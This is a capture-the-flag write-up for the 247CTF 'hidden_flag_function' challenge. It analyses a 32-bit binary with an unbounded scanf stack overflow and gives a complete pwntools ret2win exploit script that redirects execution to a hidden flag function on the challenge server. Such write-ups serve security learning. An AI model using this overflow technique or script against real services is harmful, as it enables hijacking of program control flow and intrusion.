# hidden_flag_function - 247CTF PWN Challenge

## Challenge Info
- **Name**: hidden_flag_function
- **Category**: PWN
- **Remote**: `tcp://85b822270caeab50.247ctf.com:50408`
- **Description**: "Can you control this applications flow to gain access to the hidden flag function?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### File Info
```
ELF 32-bit LSB executable, Intel 80386
Dynamically linked, not stripped
```

### Key Functions

#### flag() @ 0x08048576
Reads and prints `flag.txt` without requiring any arguments.
```c
void flag() {
    FILE *f = fopen("flag.txt", "r");
    // Read and print flag
    puts("How did you get here?");
    puts("Have a flag!");
}
```

#### chall() @ 0x080485d4
```c
void chall() {
    char buffer[0x44];  // 68 bytes reserved, but buffer at ebp-0x48
    scanf("%s", buffer);  // No size limit - OVERFLOW!
}
```

### Stack Layout in chall()
```
+------------------+ <- High addresses
|   Return Addr    | <- ebp + 4
+------------------+
|    Saved EBP     | <- ebp
+------------------+
|    Saved EBX     | <- ebp - 4
+------------------+
|                  |
|   buffer[72]     | <- ebp - 0x48
|                  |
+------------------+ <- Low addresses
```

**Offset to return address**: 0x48 + 4 = 76 bytes

---

## Vulnerability

Classic buffer overflow in `chall()`:
- `scanf("%s", buffer)` reads unlimited input
- Buffer is at `ebp-0x48` (72 bytes from EBP)
- Return address at `ebp+4`
- No stack canary, no PIE
- Can overwrite return address to redirect execution

---

## Exploitation

### Strategy
Simple ret2win - overwrite return address to jump directly to `flag()` function.

### Payload Construction
```
payload = 'A' * 76           # Fill buffer (72) + saved EBP (4)
payload += p32(0x08048576)   # Return to flag()
```

### Stack After Overflow
```
+------------------+
|   0x08048576     | <- overwritten ret -> flag()
+------------------+
|   0x41414141     | <- overwritten saved EBP
+------------------+
|                  |
|   AAAAAAAAAA     | <- buffer filled with 'A's
|                  |
+------------------+
```

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = "85b822270caeab50.247ctf.com"
PORT = 50408

# Address of the flag function
FLAG_ADDR = 0x08048576

# Offset: buffer at ebp-0x48, return address at ebp+4
# Offset = 0x48 + 4 = 76 bytes
OFFSET = 76

def exploit():
    io = remote(HOST, PORT)
    io.recvuntil(b"?")

    payload = b"A" * OFFSET
    payload += p32(FLAG_ADDR)

    io.sendline(payload)
    response = io.recvall(timeout=3)
    print(response.decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

1. **No canary + No PIE** = Classic stack buffer overflow
2. **ret2win**: Jump directly to existing `flag()` function
3. **Simple exploit**: No arguments needed, just redirect execution flow
4. Offset calculation: `buffer_offset_from_ebp + 4` (for saved EBP)

---

## Files
- `hidden_flag_function` - Challenge binary
- `solve.py` - Working exploit script
- `flag.txt` - Captured flag
